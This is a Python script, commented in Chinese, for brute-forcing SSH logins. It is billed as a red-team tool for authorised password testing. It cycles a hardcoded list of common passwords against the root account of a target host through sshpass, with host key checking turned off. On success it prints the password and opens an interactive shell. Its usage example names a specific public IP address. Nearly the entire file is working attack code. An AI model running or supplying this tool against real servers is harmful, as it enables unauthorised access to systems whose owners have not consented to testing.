#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SSH暴力破解工具 - 红队安全专家专用
用于测试SSH密码强度
"""

import subprocess
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor

class SSHBruteForce:
    def __init__(self, host, port=22, username="root"):
        self.host = host
        self.port = port
        self.username = username
        self.found_password = None
        self.attempts = 0
        
    def test_password(self, password):
        """测试单个密码"""
        try:
            cmd = [
                "sshpass", "-p", password,
                "ssh", "-o", "ConnectTimeout=5",
                "-o", "StrictHostKeyChecking=no",
                "-o", "PreferredAuthentications=password",
                f"{self.username}@{self.host}",
                "echo 'SUCCESS'"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0 and "SUCCESS" in result.stdout:
                self.found_password = password
                return True
                
        except Exception as e:
            pass
            
        self.attempts += 1
        return False
    
    def brute_force(self, password_list, max_threads=5):
        """暴力破解"""
        print(f"🔐 开始SSH暴力破解...")
        print(f"目标: {self.username}@{self.host}:{self.port}")
        print(f"密码列表: {len(password_list)} 个")
        print(f"线程数: {max_threads}")
        print("=" * 50)
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            
            for password in password_list:
                if self.found_password:
                    break
                    
                future = executor.submit(self.test_password, password)
                futures.append(future)
                
                # 显示进度
                if self.attempts % 10 == 0:
                    print(f"已尝试: {self.attempts} 个密码")
            
            # 等待结果
            for future in futures:
                if self.found_password:
                    break
                future.result()
        
        if self.found_password:
            print(f"✅ 找到密码: {self.found_password}")
            return self.found_password
        else:
            print(f"❌ 未找到正确密码 (尝试了 {self.attempts} 个)")
            return None

def main():
    # 常见密码列表
    common_passwords = [
        "admin123",
        "admin",
        "password",
        "123456",
        "root",
        "toor",
        "pass",
        "1234",
        "admin123456",
        "root123",
        "password123",
        "123456789",
        "qwerty",
        "abc123",
        "admin@123",
        "root@123",
        "12345",
        "111111",
        "000000",
        "admin123!",
        "root123!",
        "password!",
        "admin@123!",
        "root@123!",
        "123456!",
        "admin123#",
        "root123#",
        "password#",
        "admin@123#",
        "root@123#",
        "123456#"
    ]
    
    if len(sys.argv) < 2:
        print("使用方法: python3 ssh_bruteforce.py <IP地址> [端口] [用户名]")
        print("示例: python3 ssh_bruteforce.py 82.29.71.156 22 root")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
    username = sys.argv[3] if len(sys.argv) > 3 else "root"
    
    print("🚀 SSH暴力破解工具 - 红队安全专家专用")
    print("⚠️  仅用于授权的安全测试")
    print("=" * 50)
    
    brute_force = SSHBruteForce(host, port, username)
    result = brute_force.brute_force(common_passwords)
    
    if result:
        print(f"\n🎯 成功连接到 {username}@{host}:{port}")
        print(f"密码: {result}")
        
        # 尝试建立连接
        print("\n🚀 建立SSH连接...")
        try:
            subprocess.run([
                "sshpass", "-p", result,
                "ssh", "-o", "StrictHostKeyChecking=no",
                f"{username}@{host}"
            ])
        except KeyboardInterrupt:
            print("\n👋 连接已断开")
    else:
        print("\n❌ 暴力破解失败")

if __name__ == "__main__":
    main()